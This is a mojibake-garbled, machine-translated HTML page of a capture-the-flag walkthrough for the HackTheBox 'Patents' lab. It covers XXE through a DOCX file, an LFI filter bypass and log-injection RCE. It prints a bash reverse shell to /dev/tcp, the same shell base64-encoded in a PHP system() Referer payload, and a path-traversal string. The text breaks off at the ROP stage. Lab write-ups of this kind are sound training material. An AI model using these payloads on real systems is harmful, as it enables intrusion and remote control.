<!doctype html>
<html class="no-js" lang="ar">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>๐คณ๐พ โถ๏ธ ๐คถ๐พ HackTheBox. ุงุฌุชูุงุฒ ุจุฑุงุกุงุช ุงูุงุฎุชุฑุงุน. XXE ุนุจุฑ DOCX ู LFI ุฅูู RCE ู GIT ู ROP ๐ฆ ๐ฉ๐ฟโ๐จ ๐ฅ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ุฃูุงุตู ูุดุฑ ุงูุญููู ุงููุฑุณูุฉ ูููุนุงูุฌุฉ ุงูุฅุถุงููุฉ ูู ูููุน HackTheBox . 
 
 ูู ูุฐู ุงูููุงูุฉ ุ ูุณุชุบู XXE ูู ุงูุฎุฏูุฉ ูุชุญููู ูุณุชูุฏุงุช DOCX ุฅูู PDF ุ ูุงูุญุตูู ุนูู RCE...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox. ุงุฌุชูุงุฒ ุจุฑุงุกุงุช ุงูุงุฎุชุฑุงุน. XXE ุนุจุฑ DOCX ู LFI ุฅูู RCE ู GIT ู ROP</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/502268/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/mc/3s/xg/mc3sxg5brnrlwn3qmajb37t8bhk.png" alt="ุตูุฑุฉ"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฃูุงุตู ูุดุฑ ุงูุญููู ุงููุฑุณูุฉ </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูููุนุงูุฌุฉ ุงูุฅุถุงููุฉ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ูู ูููุน </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ูุฐู ุงูููุงูุฉ ุ ูุณุชุบู XXE ูู ุงูุฎุฏูุฉ ูุชุญููู ูุณุชูุฏุงุช DOCX ุฅูู PDF ุ ูุงูุญุตูู ุนูู RCE ุนุจุฑ LFI ุ ูุงูุญูุฑ ูู ุณุฌู GIT ูุงุณุชุนุงุฏุฉ ุงููููุงุช ุ ูุฅูุดุงุก ุณูุงุณู ROP ุจุงุณุชุฎุฏุงู pwntools ูุงูุนุซูุฑ ุนูู ููู ุฌุฐุฑ ูุฎูู. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุชู ุงูุงุชุตุงู ุจุงููุฎุชุจุฑ ุนุจุฑ VPN. </font><font style="vertical-align: inherit;">ูู ุงููุณุชุญุณู ุนุฏู ุงูุงุชุตุงู ูู ุฌูุงุฒ ููุจููุชุฑ ุงูุนูู ุฃู ูู ูุถูู ุญูุซ ุชุชููุฑ ุงูุจูุงูุงุช ุงููููุฉ ูู ุ ูุธุฑูุง ูุฃูู ุชุฏุฎู ูู ุดุจูุฉ ุฎุงุตุฉ ูุน ุฃุดุฎุงุต ูุนุฑููู ุดูุฆูุง ูู ูุฌุงู ุฃูู ุงููุนูููุงุช :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุงููุนูููุงุช ุงูุชูุธูููุฉ</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฑูููู</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุญุชูู ูุฐุง ุงูุฌูุงุฒ ุนูู ุนููุงู IP 10.10.10.173 ุ ูุงูุฐู ุฃุถููู ุฅูู / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.173    patents.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฃููุงู ุ ูููู ุจูุณุญ ุงูููุงูุฐ ุงูููุชูุญุฉ. </font><font style="vertical-align: inherit;">ูุธุฑูุง ูุฃูู ูุณุชุบุฑู ููุชูุง ุทูููุงู ููุญุต ุฌููุน ุงูููุงูุฐ ุจุงุณุชุฎุฏุงู nmap ุ ุณุฃูุนู ุฐูู ุฃููุงู ูุน ูุงุณูุงู. </font><font style="vertical-align: inherit;">ูููู ุจูุณุญ ุฌููุน ููุงูุฐ TCP ู UDP ูู ูุงุฌูุฉ tun0 ุจุณุฑุนุฉ 500 ุญุฒูุฉ ูู ุงูุซุงููุฉ.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.173 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/7v/ex/jr/7vexjrz3cmdge_csif-0ruxstxy.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงูุขู ุ ููุฒูุฏ ูู ุงููุนูููุงุช ุงูุชูุตูููุฉ ุญูู ุงูุฎุฏูุงุช ุงูุชู ุชุนูู ุนูู ุงูููุงูุฐ ุ ุณูููู ุจุฅุฌุฑุงุก ูุณุญ ุถูุฆู ุจุงุณุชุฎุฏุงู ุงูุฎูุงุฑ -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A patents.htb -p22,80,8888</code></pre><br>
<img src="https://habrastorage.org/webt/nk/d8/jm/nkd8jml8rg_aau8otsuwznq-ab0.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููู ุงููุถูู ุจุชุดุบูู ุฎุฏูุงุช SSH ูุฎุงุฏู ุงูููุจ Apache ุ ูุน ุงูุงุญุชูุงุธ ุจุงููููุฐ 8888 ูุฎุฏูุฉ ุบูุฑ ูููููุฉ. </font><font style="vertical-align: inherit;">ุฏุนูุง ูุฑู ุงูููุจ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/q4/ba/lv/q4balvxmcp7ac3m0qqge2qtwhcm.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุญุชูู ุงููููุน ุนูู ูููุฐุฌ ุชูุฒูู ููุซุงุฆู DOCX.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/m4/xk/if/m4xkiftz0h6oxfikutspnmyijdy.png" alt="ุตูุฑุฉ"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XXE DOCX</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููููุง ููุจูุงู ุ ุณูุชู ุชุญููู ูุซููุชูุง ุฅูู ุชูุณูู PDF. ูุฐุง ูุดูุฑ ุฅูู ููุฑุฉ XXE. ุฃุฎุฐุช ูุซุงูุงู </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูู ููุง</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/eg/mo/fo/egmofoq1l5r8ohdmorvwf83gsfe.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจุงูุชุงูู ุ ูู ูุฐุง ุงููุซุงู ุ ุณูุญุงูู ุงููุถูู ุชูุฒูู ูุณุชูุฏ xml ูู ุงูุฎุงุฏู ุงูุจุนูุฏ. ูู ุฎูุงู ุชูุฒูู ูุฐุง ุงููุณุชูุฏ ุ ุณููุฑุฃ ุงูููู ุงููุญูู ุงููุญุฏุฏ ูู ูุณุชูุฏ xml ุงูุฐู ุชู ุชูุฒููู ุ ููุฑูุฒู ูู base64 ูุณูุชุตู ุจุฎุงุฏููุง ูุฑุฉ ุฃุฎุฑู ุ ูููุฑุฑ ุงูููู ุงููุดูุฑ ููุนููุฉ ุทูุจ. ุฃู ุ ุจุนุฏ ูู ุดูุฑุฉ ูุฐู ุงููุนููุฉ ุ ูุญุตู ุนูู ุงูููู ูู ุงูุฌูุงุฒ ุงูุจุนูุฏ. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููู ูุง ููุจุบู ูุถุน ูุฐุง ุงูุญูู ุนูู ูุณุงุฑ word / document.xml. ูุธุฑูุง ูุฃูู ูุชู ุงุณุชุฎุฏุงู OpenXML SDK ููุนูู ูุน ูุฐุง ุงูููุน ูู ุงููุณุชูุฏุงุช ุ ูุฅูู ูุชุจุน </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูู ููุง</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ููู </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ููุง</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุ ุณูููู ุงูุจุฑูุงูุฌ ูู ุฌุงูุจ ุงูุฎุงุฏู ุจุงูุจุญุซ ุนู ุงูุจูุงูุงุช ูู word / document.xml ุ ู customXML / item1.xml. ูุฐูู ุ ูุฌุจ ูุถุน ุงูุญูู ููุงู. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููู ุจุฅูุดุงุก ูุณุชูุฏ docx ููู ุถุบุทู ูุฃุฑุดูู ูุถุบูุท. ุจุนุฏ ุฐูู ุ ูู ุจุฅูุดุงุก ุฏููู customXML ููู ุจุฅูุดุงุก ููู item1.xml ููู. ุณููุชุจ ููู ุงูุฑูุฒ ูู ุงูุตูุฑุฉ ุฃุนูุงู ุ ูุน ุชุบููุฑ ุนููุงู IP ุฅูู ุนููุงููุง. ููููู ุจุฃุฑุดูุฉ ุงููุซููุฉ ูุฑุฉ ุฃุฎุฑู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/s0/j_/gw/s0j_gwgd0ehur9mboxtcwz8eudg.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงูุขู ูู ุจุชุดุบูู ุฎุงุฏู ุงูููุจ ุงููุญูู.</font></font><br>
<br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููู ุงูุฏููู ุงูุญุงูู ูููู ุจุฅูุดุงุก ููู xml ุงูุซุงูู ุ ูุน ุชุญุฏูุฏ / etc / passwd ูููู ูุทููุจ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/6y/5s/l7/6y5sl7j1lcilayxrtbebn9z78tw.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุชุญููู ุงููุณุชูุฏ ุนูู ุงูุฎุงุฏู. ูู ุงููุงูุฐุฉ ุงูุชู ูุนูู ุจูุง ุฎุงุฏู ุงูููุจ ุ ุณูุฑู ุงูุงุชุตุงู ุงูุนูุณู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fj/za/to/fjzatoxzmrvwpkccdyekqyig_ju.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ุชุดููุฑ base64 ูุงุญุตู ุนูู ุงูููู ุงููุทููุจ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ef/wy/ty/efwytya0_ldxuvv1qd9qjphrib0.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุจูุฐู ุงูุทุฑููุฉ ูููููุง ูุฑุงุกุฉ ุงููููุงุช ุงูููุฌูุฏุฉ ุนูู ุงูุฎุงุฏู. ุฏุนููุง ููุฑุฃ ูููุงุช ุชูููู ุฃุจุงุชุดู. ููููุงู ุจุฐูู ุ ูู ุจุชุบููุฑ dtd.xml ููุฑุฑ ุชูุฒูู ุงููุณุชูุฏ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/um/0q/xq/um0qxqy-zxbvhbbe-dgz2_05msy.png" alt="ุตูุฑุฉ"><br>
<br>
<img src="https://habrastorage.org/webt/-x/nf/zh/-xnfzhmk9bbhd8fjx5eko5vbaeg.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฐูู ููุชุดู ุงูุฏููู ุงูุฐู ููุฌุฏ ููู ุงููููุน. ุฏุนููุง ูุญุงูู ูุฑุงุกุฉ ููู ุงูุชูููู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_b/dd/-v/_bdd-vrylmvfa98iklgx3lnykzi.png" alt="ุตูุฑุฉ"><br>
<br>
<img src="https://habrastorage.org/webt/pq/5l/ht/pq5lhtyyzajjcijlbaa0hubw5j4.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููููู ุงูุชุนููู ุฃูู ุชูุช ุฅุนุงุฏุฉ ุชุณููุฉ ุงูููู ุจุณุจุจ ุงูุถุนู. </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุณูุดูุฑ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ุจุงูุทุจุน ุฅูู ุฐูู </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">patents.htb / getPatent_alphav1.0.php</font></a><font style="vertical-align: inherit;"> .</font></font><br>
<br>
<img src="https://habrastorage.org/webt/hq/wd/hj/hqwdhjf6zhjdaehc2zn6ic5p3hu.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุจุงูุงูุชูุงู ุฅูู ูุฐู ุงูุตูุญุฉ ูุชูุฑูุฑ ุงููุณุงุฑ ../../../../../etc/passwd ููุนููุฉ ูุนุฑู ุ ุณูุชู ุญุฐู ุฌููุน ุชูุฑุงุฑุงุช "../" ูู ุงูุณุทุฑ ุงูุฎุงุต ุจูุง. </font><font style="vertical-align: inherit;">ุฏุนูุง ูุณุชุจุฏู ูู ุณุทุฑ "../" ุจู "... /. /" ุ ูุฐุง ุฅุฐุง ููุช ุจุญุฐู ุชุณูุณู ุ ูุณูุธู "../". </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fr/a3/pu/fra3pugykwho9xrl9xcklono1zg.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุฌุฏ LFI.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ููุทุฉ ุงูุฏุฎูู</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนููุง ูุญุงูู ุงูุญุตูู ุนูู RCE ูู ูุฐุง. </font><font style="vertical-align: inherit;">ุจุตุฑุงุญุฉ - ูุงู ุงูุฃูุฑ ุตุนุจูุง. </font><font style="vertical-align: inherit;">ูุงูุญูููุฉ ูู ุฃูู ุนูุฏ ุฅุฑุณุงู ูุซู ูุฐุง ุงููุณุชูุฏ ุ ูู ูุชูู ุนุฑุถูุง ูุชูุฒูู PDF. </font><font style="vertical-align: inherit;">ุฃู ุฃูู ุชู ุงุณุชุฎุฏุงู ุงููุงุตู 2 (ูุนุฑุถ ุฑุณุงุฆู ุงูุชุดุฎูุต ูุชุตุญูุญ ุงูุฃุฎุทุงุก ูู ุดูู ูุตู). </font><font style="vertical-align: inherit;">ููููููุง ุฃู ููุฌุฃ ุฅููู. </font><font style="vertical-align: inherit;">ุฏุนููุง ุชุฑููุฒ ูุฐููุฉ ุนูุณูุฉ ูู base64:</font></font><br>
<br>
<pre><code class="bash hljs">/bin/bash -c <span class="hljs-string">'/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.211/4321 0&gt;&amp;1;'</span></code></pre><pre><code class="bash hljs">L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุณูููู ุจูู ุชุดููุฑูุง ูููููุง ุฅูู ูุธููุฉ ุงููุธุงู ูู php. </font><font style="vertical-align: inherit;">ุฏุนูุง ููุฑุฑ ุงูุฑูุฒ ูุนููุงู HTTP ุนูุฏ ุชุญููู ููู.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/convert.php -F <span class="hljs-string">"userfile=@file.docx"</span> -F <span class="hljs-string">'submit=Generate PDF'</span> --referer <span class="hljs-string">'http://test.com/&lt;?php system(base64_decode("L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn")); ?&gt;'</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ุจุชุดุบูู netcat.</font></font><br>
<br>
<pre><code class="bash hljs">nc -lvp 4321</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุงูุขู ุฏุนููุง ููุชูู ุฅูู ุงููุงุตู ุงูุซุงูู.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/getPatent_alphav1.0.php?id=....//....//....//....//....//....//....//proc//self//fd//2</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุนูุฏ ุงูุงุชุตุงู. </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุงูุฌุฐุฑ 1</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุชุญููู ูุธุงู ุงููุต ูููู </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">linpeas</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ูุชุญููู ุงููุฎุฑุฌุงุช ุจุนูุงูุฉ. </font><font style="vertical-align: inherit;">ูุฐูู ูุญู ูุนูู ูู ุญุงููุฉ ุนุงูู ูููุงุก. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sa/hf/xz/sahfxzrubyathg6rglkqhwf0cvo.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฌุฏ ุฃูุถูุง ุชุฌุฒุฆุงุช. </font><font style="vertical-align: inherit;">ููู ุงููุฑุตูุฉ ุ ูุง ูุตู ุฅูู ุดูุก. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bf/cc/dy/bfccdyitk-1ksi7qmg5omq_lesw.png" alt="ุตูุฑุฉ"><br>
<br>
<img src="https://habrastorage.org/webt/dv/ss/up/dvssupnunggkpzz64gsfdxjveuw.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฐูู ุ ูู ุจุชุดุบูู </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pspy64</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ูุชุชุจุน ุงูุนูููุงุช ุงูุฌุงุฑูุฉ. </font><font style="vertical-align: inherit;">ููุฌุฏ ุจุฏุงูุฉ ุงูุนูููุฉ ูุฌุฐุฑ ุ ุญูุซ ูุชู ุชูุฑูุฑ ูููุฉ ุงููุฑูุฑ ููุชุบูุฑ ุจูุฆุฉ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wi/2_/yz/wi2_yzfeqgi3eehjxylmqf7k8vm.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุชุบููุฑ ุงููุณุชุฎุฏู ูุญูููุง ุจุฅุฏุฎุงู ูููุฉ ุงููุฑูุฑ ูุฐู.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/iu/bi/yu/iubiyu543de3olgssz1ry-djuf4.png" alt="ุตูุฑุฉ"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุงูุฌุฐุฑ 2</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนููุง ูุฑู ูุง ููุนูู ูุฐุง ุงูุจุฑูุงูุฌ ุงููุตู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/vk/h-/ckvkh-wezr0ofumiqzzqakn5wog.png" alt="ุตูุฑุฉ"><br>
<br>
<img src="https://habrastorage.org/webt/rg/tf/rs/rgtfrsor5irhivfoifw-jr6c008.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุญุตู ุนูู ูุตูุญุฉ ุญูู ุจุนุถ lfmserver ุ ููุญูุธ ุฃูุถูุง ุงุณู ุงููุณุชุฎุฏู ููููุฉ ุงููุฑูุฑ. </font><font style="vertical-align: inherit;">ุฏุนููุง ููุธุฑ ูู ุงููุธุงู ููู ูุง ูุชุนูู lfm. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/af/hz/ea/afhzea8jusqqac6irjgch6kyvjy.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุฌุฏ ูุณุชูุฏุน git ูู ูุฐุง ุงูุฏููู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ln/h4/op/lnh4opchyrjvoc88mmg8kiwe7_y.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููุนูู ูุน ูุฐุง ุงููุณุชูุฏุน. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gq/by/ge/gqbygeqd2j4xoshvorswvluxkno.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนููุง ูุฑู ุชุงุฑูุฎ ุงูุชุบููุฑุงุช. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/t7/ro/rj/t7rorjk0v42cfsjtphjd9uc1fs0.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนููุง ูุฑู ุชุงุฑูุฎ ุงูุชุบููุฑุงุช. </font><font style="vertical-align: inherit;">ูุฐูู ูุฑู ุฃูู ูู ุงูุฅูุชุฒุงู ูุจู ุงูุฃุฎูุฑ ุ ุชูุช ุฅุถุงูุฉ ููู ูุงุจู ููุชูููุฐ ููุตู ุ ููู ุงูููุงูุฉ ุชู ุญุฐูููุง ุจุงููุนู. </font><font style="vertical-align: inherit;">ุฏุนููุง ูุชุฑุงุฌุน ูุจู ุญุฐู ุงููููุงุช.</font></font><br>
<br>
<pre><code class="bash hljs">git revert 7c6609240f414a2cb8af00f75fdc7cfbf04755f5</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููู ุฏููููุง ุธูุฑ ููู ููุตู ูุงุจู ููุชูููุฐ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ga/wc/4s/gawc4s_vovqdv6zz91jdrdbicfk.png" alt="ุตูุฑุฉ"><br>
<br>
<img src="https://habrastorage.org/webt/y5/ns/gi/y5nsgibu66e8a0_g_34mde9b2ao.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุง ุฃุฑุฏุช ุจุงููุนู ุจุฏุก ุนูุณ ุงูููู ุ ูููู - ูุฏููุง ูุดุฑูุน ุจูุงุจุฉ! </font><font style="vertical-align: inherit;">ููุฏ ูุฌุฏุช ุงูุชุฒุงููุง ูุฐูุฑ ุฑููุฒ ุงููุตุฏุฑ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/7m/xr/ki/7mxrkibt8ixidkd4tir6ksasywk.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฏุนูุง ูุณุชุนูุฏ ุงููููุงุช.</font></font><br>
<br>
<pre><code class="bash hljs">git checkout 0ac7c940010ebb22f7fbedb67ecdf67540728123</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุจุนุฏ ุฐูู ูููู ุจุชูุฒูู ุฃููุงุฏ ุงููุตุฏุฑ ุ ุงูุจุฑูุงูุฌ ููุณู ูุงูููุชุจุงุช ุฅูู ุงูุฌูุงุฒ ุงููุญูู. </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฑูุจ</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุญุชุงุฌ ุฅูู ูุญุงููุฉ ุงูุนุซูุฑ ุนูู ุงูุซุบุฑุฉ ุงูุฃูููุฉ ูู ุงูุจุฑูุงูุฌ ูุงุณุชุบูุงููุง ุ ูููุงู ุฑููุฒ ูุตุฏุฑ ูููุณุงุนุฏุฉ. </font><font style="vertical-align: inherit;">ุฏุนููุง ูุชุญูู ูู ุงูุญูุงูุฉ ูู ููู ุซูุงุฆู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/pq/fj/bd/pqfjbdyozi1qaxhxeauf1_hfcca.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฃู ุฃู ุงูููุงุฑู ู PIE ููููุฏุงู ุ ููู ุงูููุฏุณ ุบูุฑ ูุงุจู ููุชูููุฐ. </font><font style="vertical-align: inherit;">ุฏุนููุง ููุชุญ ุงูููู ุงูุซูุงุฆู ูู ุฃู ุฃุฏุงุฉ ุชูููู ุจูุญูู ููุงุฆู ูู (ุฃุณุชุฎุฏู IDA Pro 7.2) ูููุงุฑู ุงูุดูุฑุฉ ุงูุชู ุชู ูู ุดูุฑุชูุง ูุน ุฑููุฒ ุงููุตุฏุฑ ูู ุงููุณุชูุฏุน. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/rc/ue/tzrcued2khgzxq9jmhziq7vsfl4.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
